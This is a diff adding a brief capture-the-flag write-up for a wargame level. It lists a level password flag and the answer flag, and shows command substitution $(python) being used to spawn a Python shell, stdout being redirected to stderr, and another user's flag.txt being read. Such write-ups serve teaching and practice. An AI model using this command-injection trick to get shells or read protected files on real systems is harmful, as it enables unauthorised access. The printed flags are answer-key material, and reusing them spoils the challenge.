@@ -1,0 +1,17 @@
+user : level2
+pass : FLAG-U96l4k6m72a051GgE5EN0rA85499172K
+
+running $(python) open a python shell
+
+Nothing is printed since stdout is redirected because of $()
+
+change stdout to stderr :
+import sys
+sys.stdout = sys.stderr
+
+We now need to read the file :
+f = open('/home/level2/flag.txt','r');
+
+f.read()
+
+FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
